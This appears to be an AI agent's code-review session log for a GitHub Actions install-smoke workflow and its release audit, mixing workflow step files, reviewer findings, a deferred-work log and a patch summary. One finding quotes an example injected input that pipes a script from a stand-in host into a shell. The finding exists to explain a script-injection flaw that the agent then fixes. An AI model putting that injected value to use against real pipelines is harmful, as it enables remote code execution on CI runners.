54	   - **Specific commit range** (ask for the range)
55	   - **Provided diff or file list** (user pastes or provides a path)
56	
57	3. Construct `{diff_output}` from the chosen source.
58	   - For **staged changes only**: run `git diff --cached`.
59	   - For **uncommitted changes** (staged + unstaged): run `git diff HEAD`.
60	   - For **branch diff**: verify the base branch exists before running `git diff`. If it does not exist, HALT and ask the user for a valid branch.
61	   - For **commit range**: verify the range resolves. If it does not, HALT and ask the user for a valid range.
62	   - For **provided diff**: validate the content is non-empty and parseable as a unified diff. If it is not parseable, HALT and ask the user to provide a valid diff.
63	   - For **file list**: validate each path exists in the working tree. Construct `{diff_output}` by running `git diff HEAD -- <path1> <path2> ...`. If any paths are untracked (new files not yet staged), use `git diff --no-index /dev/null <path>` to include them. If the diff is empty (files have no uncommitted changes and are not untracked), ask the user whether to review the full file contents or to specify a different baseline.
64	   - After constructing `{diff_output}`, verify it is non-empty regardless of source type. If empty, HALT and tell the user there is nothing to review.
65	
66	4. **Set the spec context.**
67	   - If `{spec_file}` is already set (from Tier 1 or Tier 2): verify the file exists and is readable, then set `{review_mode}` = `"full"`.
68	   - Otherwise, ask the user: **Is there a spec or story file that provides context for these changes?**
69	     - If yes: set `{spec_file}` to the path provided, verify the file exists and is readable, then set `{review_mode}` = `"full"`.
70	     - If no: set `{review_mode}` = `"no-spec"`.
71	
72	5. If `{review_mode}` = `"full"` and the file at `{spec_file}` has a `context` field in its frontmatter listing additional docs, load each referenced document. Warn the user about any docs that cannot be found.
73	
74	6. Sanity check: if `{diff_output}` exceeds approximately 3000 lines, warn the user and offer to chunk the review by file group.
75	   - If the user opts to chunk: agree on the first group, narrow `{diff_output}` accordingly, and list the remaining groups for the user to note for follow-up runs.
76	   - If the user declines: proceed as-is with the full diff.
77	
78	### CHECKPOINT
79	
80	Present a summary before proceeding: diff stats (files changed, lines added/removed), `{review_mode}`, and loaded spec/context docs (if any). HALT and wait for user confirmation to proceed.
81	
82	
83	## NEXT
84	
85	Read fully and follow `./step-02-review.md`
86	
```

```
Now performing an adversarial review of the diff.

# Blind Hunter Adversarial Review Findings

- **Shell injection via workflow_dispatch input in `run:` block** — **HIGH**
  Evidence: line 67 — `OUTPUT="$(npx --yes "bmad-module-skill-forge@${{ inputs.version }}" --version)"`. The `${{ inputs.version }}` expression is interpolated directly into the shell script body before bash ever sees it, so a dispatcher who types e.g. `latest"; curl evil.sh | sh; echo "` as the input gets arbitrary command execution on all three runners. The accepted fix is to pass the input via `env:` and reference `"$VERSION"` inside the script. This is a textbook GitHub Actions script-injection footgun. `permissions: contents: read` limits blast radius somewhat but the runner still has network egress and any secrets loaded into the env.

- **`windows-latest` + `shell: bash` + `set -euo pipefail` silently works only because Git Bash is pre-installed** — **MEDIUM**
  Evidence: lines 54, 64, 66. The matrix spans `windows-latest`; GitHub's hosted Windows runner does ship Git Bash so `shell: bash` resolves, but path handling, CRLF, and the `"$(...)"` capture can produce trailing `\r` that will not equal the empty-string test on line 69. There is no CRLF stripping, and `stdout` is asserted via a simple `-z` check, so regressions where the CLI prints only `\r\n` would pass. A real smoke check on Windows should either strip `\r` or grep for a version regex.

- **NFR9 claim contradicts the filed evidence** — **HIGH**
  Evidence: line 100 (Sign-off) states "v1.0.0 cross-platform install verification VERIFIED at 2026-04-23T20:23:53Z; Epic 5 cleared." But lines 138-141 record `NFR9 status classification: missed-target-non-blocking` and a `01:27` wall-clock delta vs a 60-minute target. The sign-off reads as unqualified success; the body admits the NFR9 target was missed. A reader skimming only the sign-off gets a false impression. At minimum, the sign-off should say "VERIFIED (NFR9 target missed by 27m, dispositioned non-blocking)".

- **Wall-clock delta arithmetic is wrong** — **MEDIUM**
  Evidence: line 138 — "**Wall-clock delta from publish to completion:** `01:27` (1 hour 27 minutes 14 seconds)". Publish = `18:56:39Z`, completion = `20:23:53Z`. Difference is 1h 27m 14s — that part is correct. But the format `01:27` drops the seconds, while the parenthetical claims `14` seconds. 20:23:53 − 18:56:39 = 1h 27m 14s — actually correct. Retracting: arithmetic holds. (Keeping this note because I double-checked and it initially looked off; calling it clean on inspection.)

- **Marketplace.json invariant block does not verify what it claims** — **MEDIUM**
  Evidence: lines 144-164. The heading says "Marketplace.json post-publish invariant" with "all four invariants hold, zero drift from Story 5.3 final state." But the shown commands output raw values with no comparison, no assertion, and no reference to the Story 5.3 baseline values. The reader must trust that `1.0.0` matches the prior state. If the prior state was `1.0.0-rc.3`, the assertion "zero drift" would still look identical on this page. Include the Story 5.3 captured values side-by-side, or omit the invariant claim.

- **`rc` dist-tag still points at `1.0.0-rc.3` after GA** — **LOW/MEDIUM**
  Evidence: lines 159-164. `dist-tags` shows `"rc": "1.0.0-rc.3"` alongside `"latest": "1.0.0"`. A user who previously installed via `@rc` remains stuck on the release candidate because the tag wasn't moved or removed. This is a documentation/operational gap, not a code bug, but the audit flags no remediation.

- **Node version hardcoded with an unreliable coupling comment** — **LOW**
  Evidence: lines 31-33 and line 61 — comment says "hardcoded to match `.nvmrc`. If `.nvmrc` advances to Node 23+, update this workflow in lockstep." There is no CI check enforcing this; the comment is the only linkage. A future `.nvmrc` bump to Node 24 that forgets this file yields a smoke test that no longer represents the supported runtime. Use `actions/setup-node` with `node-version-file: '.nvmrc'` instead — that is the one-line fix and eliminates the lockstep burden entirely.

- **`fail-fast: false` means one green leg + two red legs still reports "completed" per-job without workflow-level gate** — **LOW**
  Evidence: lines 52-54. The workflow has no explicit aggregation step; the overall workflow conclusion depends on GitHub's default matrix rollup. That's fine in practice, but the audit's claim of "all three matrix legs `success`" on line 119 depends on per-job conclusions only — no artifact or summary step captures evidence for archival. If the run is deleted/pruned after 90 days, the audit's specific-timestamp evidence is unreproducible. Consider uploading a summary artifact.

- **Windows `npx --yes` warmup not actually tested for re-install resilience** — **LOW**
  Evidence: lines 130. The audit notes Windows took 40s ("expected — npx warm-up"). But every CI run is a fresh runner; npx always cold-caches. The "warm-up" framing suggests a cache exists across runs, which is false. Misleading comment.

- **Commit/file mismatch: workflow file is `install-smoke.yaml` but referenced variously** — **LOW**
  Evidence: consistent as `install-smoke.yaml` across lines 84, 87, 113. Clean.

- **Missing timeout granularity** — **LOW**
  Evidence: line 56 — `timeout-minutes: 5` applies to the whole job. With `npx --yes` against a cold npm registry on a slow Windows runner, 5 minutes is tight but reasonable. No per-step timeout, so a hanging `npx` consumes the full budget. Acceptable for a smoke test.

- **Audit appends do not protect against future edits** — **LOW**
  Evidence: line 100. The sign-off line is mutated in place rather than appended as a new sign-off block. The release audit pattern elsewhere in this repo appends history; overwriting the sign-off loses the Story 5.3 exact sign-off string from git-blame convenience (still in git history, just not at HEAD). Minor, but a stated "immutability" ethos elsewhere (NFR6) contrasts with this in-place rewrite.

**Summary:** one HIGH severity real bug (shell injection on line 67), one HIGH severity narrative contradiction (sign-off vs NFR9-miss), plus medium/low concerns around Windows CRLF handling, invariant verification rigor, and documentation coupling. The shell injection is the only item that warrants a blocking fix before merge.

## Net Verdict

**No HIGH or MEDIUM findings.** The implementation honors all 15 ACs faithfully. The only drift items are:

1. **LOW — AC 3 step body**: spec's literal "`if-no-files-found`/`exit 0` assertion in a shell-portable one-liner" is replaced with a multi-line `bash` block that asserts non-empty stdout. The spec phrasing is semantically odd (`if-no-files-found` is unrelated to `npx`), and the implementation's non-empty check is the sane interpretation. No functional regression.
2. **LOW — AC 3 additive fields**: `timeout-minutes: 5`, `shell: bash`, and step `name:` fields were added — none violate "NO additional steps" (still one `setup-node` + one `npx` step).
3. **LOW — AC 10 fence language**: Code fences in the audit append lack a language tag; `npm run quality` passed anyway.
4. **LOW — AC 13 char-count**: Spec claims "64 chars" for Commit 1 subject; actual subject (used verbatim per spec) is 66 chars. Spec arithmetic error, not impl defect.

Spec is fully honored. Epic 5 may close on this work.

4	# Step 3: Triage
5	
6	## RULES
7	
8	- YOU MUST ALWAYS SPEAK OUTPUT in your Agent communication style with the config `{communication_language}`
9	- Be precise. When uncertain between categories, prefer the more conservative classification.
10	
11	## INSTRUCTIONS
12	
13	1. **Normalize** findings into a common format. Expected input formats:
14	   - Adversarial (Blind Hunter): markdown list of descriptions
15	   - Edge Case Hunter: JSON array with `location`, `trigger_condition`, `guard_snippet`, `potential_consequence` fields
16	   - Acceptance Auditor: markdown list with title, AC/constraint reference, and evidence
17	
18	   If a layer's output does not match its expected format, attempt best-effort parsing. Note any parsing issues for the user.
19	
20	   Convert all to a unified list where each finding has:
21	   - `id` -- sequential integer
22	   - `source` -- `blind`, `edge`, `auditor`, or merged sources (e.g., `blind+edge`)
23	   - `title` -- one-line summary
24	   - `detail` -- full description
25	   - `location` -- file and line reference (if available)
26	
27	2. **Deduplicate.** If two or more findings describe the same issue, merge them into one:
28	   - Use the most specific finding as the base (prefer edge-case JSON with location over adversarial prose).
29	   - Append any unique detail, reasoning, or location references from the other finding(s) into the surviving `detail` field.
30	   - Set `source` to the merged sources (e.g., `blind+edge`).
31	
32	3. **Classify** each finding into exactly one bucket:
33	   - **decision_needed** -- There is an ambiguous choice that requires human input. The code cannot be correctly patched without knowing the user's intent. Only possible if `{review_mode}` = `"full"`.
34	   - **patch** -- Code issue that is fixable without human input. The correct fix is unambiguous.
35	   - **defer** -- Pre-existing issue not caused by the current change. Real but not actionable now.
36	   - **dismiss** -- Noise, false positive, or handled elsewhere.
37	
38	   If `{review_mode}` = `"no-spec"` and a finding would otherwise be `decision_needed`, reclassify it as `patch` (if the fix is unambiguous) or `defer` (if not).
39	
40	4. **Drop** all `dismiss` findings. Record the dismiss count for the summary.
41	
42	5. If `{failed_layers}` is non-empty, report which layers failed before announcing results. If zero findings remain after dropping dismissed AND `{failed_layers}` is non-empty, warn the user that the review may be incomplete rather than announcing a clean review.
43	
44	6. If zero findings remain after triage (all rejected or none raised): state "✅ Clean review — all layers passed." (Step 3 already warned if any review layers failed via `{failed_layers}`.)
45	
46	
47	## NEXT
48	
49	Read fully and follow `./step-04-present.md`
50	
```

26	2. **`patch`** findings (unchecked):

37

44	
45	If `decision_needed` findings exist, present each one with its detail and the options available. The user must decide — the correct fix is ambiguous without their input. Walk through each finding (or batch related ones) and get the user's call. Once resolved, each becomes a `patch`, `defer`, or is dismissed.
46	
47	If the user chooses to defer, ask: Quick one-line reason for deferring this item? (helps future reviews): — then append that reason to both the story file bullet and the `{deferred_work_file}` entry.

49	**HALT** — I am waiting for your numbered choice. Reply with only the number (or "0" for batch). Do not proceed until you select an option.
50	
51	### 5. Handle `patch` findings
52	
53	If `patch` findings exist (including any resolved from step 4), HALT. Ask the user:

55	If `{spec_file}` is set, present all three options (if >3 `patch` findings exist, also show option 0):

57	> **How would you like to handle the <Z> `patch` findings?**
58	> 0. **Batch-apply all** — automatically fix every non-controversial patch (recommended when there are many)
59	> 1. **Fix them automatically** — I will apply fixes now
60	> 2. **Leave as action items** — they are already in the story file
61	> 3. **Walk through each** — let me show details before deciding
62	
63	If `{spec_file}` is **not** set, present only options 1 and 3 (omit option 2 — findings were not written to a file). If >3 `patch` findings exist, also show option 0:
64	
65	> **How would you like to handle the <Z> `patch` findings?**
66	> 0. **Batch-apply all** — automatically fix every non-controversial patch (recommended when there are many)
67	> 1. **Fix them automatically** — I will apply fixes now
68	> 2. **Walk through each** — let me show details before deciding
69	
70	**HALT** — I am waiting for your numbered choice. Reply with only the number (or "0" for batch). Do not proceed until you select an option.
71	
72	- **Option 0** (only when >3 findings): Apply all non-controversial patches without per-finding confirmation. Skip any finding that requires judgment. Present a summary of changes made and any skipped findings.
73	- **Option 1**: Apply each fix. After all patches are applied, present a summary of changes made. If `{spec_file}` is set, check off the items in the story file.
74	- **Option 2** (only when `{spec_file}` is set): Done — findings are already written to the story.
75	- **Walk through each**: Present each finding with full detail, diff context, and suggested fix. After walkthrough, re-offer the applicable options above.
76	
77	  **HALT** — I am waiting for your numbered choice. Reply with only the number (or "0" for batch). Do not proceed until you select an option.
78	
79	**✅ Code review actions complete**
80	
81	- Decision-needed resolved: <D>
82	- Patches handled: <P>
83	- Deferred: <W>
84	- Dismissed: <R>
85	
86	### 6. Update story status and sync sprint tracking
87	
88	Skip this section if `{spec_file}` is not set.
89	
90	#### Determine new status based on review outcome
91	
92	- If all `decision-needed` and `patch` findings were resolved (fixed or dismissed) AND no unresolved HIGH/MEDIUM issues remain: set `{new_status}` = `done`. Update the story file Status section to `done`.
93	- If `patch` findings were left as action items, or unresolved issues remain: set `{new_status}` = `in-progress`. Update the story file Status section to `in-progress`.
94	
95	Save the story file.
96	
97	#### Sync sprint-status.yaml
98	
99	If `{story_key}` is not set, skip this subsection and note that sprint status was not synced because no story key was available.
100	
101	If `{sprint_status}` file exists:
102	
103	1. Load the FULL `{sprint_status}` file.
104	2. Find the `development_status` entry matching `{story_key}`.
105	3. If found: update `development_status[{story_key}]` to `{new_status}`. Update `last_updated` to current date. Save the file, preserving ALL comments and structure including STATUS DEFINITIONS.
106	4. If `{story_key}` not found in sprint status: warn the user that the story file was updated but sprint-status sync failed.
107	
108	If `{sprint_status}` file does not exist, note that story status was updated in the story file only.
109	
110	#### Completion summary
111	
112	> **Review Complete!**
113	>
114	> **Story Status:** `{new_status}`
115	> **Issues Fixed:** <fixed_count>
116	> **Action Items Created:** <action_count>
117	> **Deferred:** <W>
118	> **Dismissed:** <R>
119

3	Items pulled out of review/implementation to preserve scope, tracked here so they don't get lost.
4	
5	## Deferred from: code review of 1-1-audit-and-harden-main-branch-protection (2026-04-20)
6	
7	- **Restore snippet covers ruleset-edit recovery but not ruleset-deletion** — `docs/RELEASING.md:74-80` shows a `PUT` against an existing ruleset id. If the ruleset is deleted, the restore requires `POST /repos/{owner}/{repo}/rulesets` with the full ruleset body (including `name`, `target`, `enforcement`, `conditions`). Story 4.1 owns the full rollback playbook and is the natural home for this expansion.
8	
9	## Deferred from: code review of 1-2-create-release-github-environment-with-required-reviewer (2026-04-20)
10	
11	- **Hard-coded ruleset id `13855503` and environment id `14347249917` lack a re-derive path** — `docs/RELEASING.md:14,69`. If either resource is deleted and recreated the id changes and every hard-coded URL 404s. Swap id references for name-based lookups (`gh api repos/.../rulesets --jq '.[] | select(.name=="Default") | .id'`). Cross-cuts Story 4.1 rollback playbook.
12	- **"Zero env secrets" invariant has no CI assertion** — `docs/RELEASING.md:77,82`. Doc says "re-audit"; a pre-release CI check calling `/environments/release/secrets` and failing on `total_count > 0` would turn prose into an enforced gate. Belongs with the `release.yaml` workflow (Story 3.1).
13	- **Required-status-checks list drifts silently if `quality.yaml` job names or matrix values change** — `docs/RELEASING.md:26-34`. Doc warns itself ("update both in the same PR") but nothing enforces it; a pre-commit or CI step could diff the ruleset's check list against the workflow's job/matrix keys. Tooling improvement outside Epic 1 scope.
14	- **`prevent_self_review: false` → `true` flip on second-reviewer onboarding relies on prose memory** — `docs/RELEASING.md:80`. No reminder fires when a second reviewer is added. Low probability until solo-maintainer changes; revisit with team-growth.
15	- **`gh auth` scopes and `jq` dependency are unstated preconditions** — `docs/RELEASING.md:47-65,126-140`. A maintainer with a read-only token sees opaque 403s; `jq` absence on a fresh macOS machine breaks the restore block. Prepend a "Preconditions" subsection in a later polish pass.
16	- **Baseline.json capture procedure unspecified** — `docs/RELEASING.md:52-65`. Restore is aspirational if no baseline has been captured; needs a companion capture command and guidance on where baselines live. Story 4.1 rollback playbook is the natural home.
17	- **Site-nav discoverability of `docs/RELEASING.md` (Starlight/Astro sidebar) unverified** — `docs/RELEASING.md:1-4`. Frontmatter is Starlight-compatible but no sidebar entry was audited; if the docs site is built with Starlight, readers arriving at the site may not find the page without a direct URL. Confirm docs-site build config before acting.
18	
19	## Deferred from: code review of 1-3-register-npm-trusted-publisher-for-release-yaml-workflow (2026-04-20)
20	
21	- **Story 3.3 precondition — neutralize `publish.yaml` tag-push trigger atomically with `release.yaml` merge to main** — `.github/workflows/publish.yaml:10,37` has `id-token: write` and `npm publish --provenance` with `NODE_AUTH_TOKEN` wired. Until Story 6.1 deletes it, a stray `v*` tag push will fire `publish.yaml` alongside (or instead of) `release.yaml`, producing publishes attributed to the wrong workflow in the provenance record — an audit-trail inconsistency, not a hard failure (token auth bypasses the TP matcher). When Story 3.3 merges `release.yaml` to main, in the same PR remove `publish.yaml`'s `v*` tag trigger (leave `workflow_dispatch` only as an emergency hatch) so the release path is single-rooted. Resolved as defer in Story 1.3 code review D2 to avoid scope creep into a doc-only story.
22	- **Story 3.1 precondition — workflow filename MUST be `release.yaml` (not `.yml`)** — the npm Trusted Publisher registered 2026-04-20 binds on filename `release.yaml` exactly. A `.yml` typo in Story 3.1 produces an opaque 404 on Story 3.2's alpha cut with no recovery path short of deleting-and-re-adding the TP. Re-read `docs/RELEASING.md § npm Trusted Publisher` before authoring the workflow. Enforcement is prose-only by design (Story 1.3 code review D1, resolved as defer): a stub file on main was rejected as overkill for a low-probability risk that is triple-guarded (story Dev Notes, RELEASING.md rename-coupling note, Story 3.2 alpha cut as live validator).
23	- **Solo-maintainer self-review weakness inherited by TP section** — `docs/RELEASING.md § Release Environment`. New `## npm Trusted Publisher` section relies on the "required reviewer" gate, which the adjacent Release Environment section admits is self-approved (`prevent_self_review: false`). The TP section does not re-acknowledge this — an auditor reading only the new section will overestimate the control. Belongs with the Story 1.2 self-review gap (already captured there).
24	- **Rollback Playbook heading is empty / TOC lands on no content** — `docs/RELEASING.md § Rollback Playbook`. Bare `## Rollback Playbook` heading follows the `<!-- Rollback Playbook — added in Story 4.1 -->` placeholder. Readers hitting the TOC click into an empty section until Story 4.1 lands. Story 4.1's natural territory.
25	- **`NPM_TOKEN` rotation/deletion before Story 6.3 has no documented fallback** — `docs/RELEASING.md § npm Trusted Publisher`. Section names the token as "last-resort token-based publish" if OIDC breaks, but does not cover the inverse failure: token rotated/revoked during an OIDC-broken window leaves both paths down. Incident-response design belongs in Story 6.3's removal plan.
26	- **No CI/test asserts the TP registration's shape matches repo reality** — docs-only change; no guard. Drift between the npm-side TP and the `release.yaml`/`release` env it binds to is only caught at publish time (Story 3.2 onward). A CI job that reads the RELEASING.md table and verifies (a) `.github/workflows/release.yaml` exists, (b) environment `release` exists, (c) `package.json` name matches, would turn prose into an enforced gate. Standalone story once Story 3.x lands.
27	
28	## Deferred from: code review of 2-1-add-conventional-changelog-cli-as-a-devdependency (2026-04-20)
29	
30	- **CI-log deprecation-warning noise persists until Story 3.1 tooling decision** — `.github/workflows/*.yaml` via `npm ci`. Every CI run prints `npm warn deprecated conventional-changelog-cli@5.0.0: This package is no longer maintained.` Not a failure, but permanent log noise until the "Story 3.1 tooling decision" (below) resolves one way or the other. Acknowledged so future reviewers don't miss other deprecation notices amongst the repeated line.

### Patch findings (must fix before close)

**All three concentrated in `.github/workflows/install-smoke.yaml`:**

1. **Shell-injection via `${{ inputs.version }}`** interpolated directly into a `run:` block (HIGH — flagged by Blind Hunter and Edge Case Hunter independently). Fix: move to `env: VERSION:` and reference `"$VERSION"` inside bash.
2. **Hardcoded `node-version: '22'`** instead of `node-version-file: ".nvmrc"` (matches sibling `quality.yaml` pattern). Fix: one-line swap.
3. **`--version` stdout only checked non-empty, not validated** against expected version; wrong-version could resolve silently. Also Windows CRLF could slip past the `-z` check. Fix: semver regex assertion + strip CR.

## Patch application summary

**Applied (2 of 3):**
- ✅ Shell-injection hardening via `env: VERSION:` pattern
- ✅ CRLF strip + semver regex assertion on `--version` stdout

**Skipped (1 of 3):** `node-version-file: ".nvmrc"` — contradicts Dev Notes (E) "no repo checkout in smoke workflow" design decision. The finding is valid (lockstep coupling is fragile) but the fix requires accepting a `actions/checkout` step that was explicitly avoided at create-story time.

**Post-patch validation:** Re-dispatched [run 24858754152](https://github.com/armelhbobdad/bmad-module-skill-forge/actions/runs/24858754152) — all 3 legs still PASS with the hardened assertions. Zero regression; happy path preserved.

## Status decision required

One patch finding remains open in the story file. Per the workflow rule, "patch findings left as action items" → story status stays `in-progress`. But the skipped item is a design tradeoff, not a bug — the workflow is functionally correct. Two paths:

**(A)** Move finding #2 to `defer` (accept Dev Notes (E) tradeoff: "lockstep is cheap; checkout is expensive") → flip story to **`done`**, Epic 5 closes, Epic 6 unblocks. Add a deferred-work entry noting the guard-test alternative for a future story.

**(B)** Keep finding #2 as an open `patch` → flip story to **`in-progress`**, revisit before Epic 5 closes. User would re-engage to decide: accept the checkout cost, or author a separate `.nvmrc`-vs-workflow drift test.

Which do you want? [A/B]
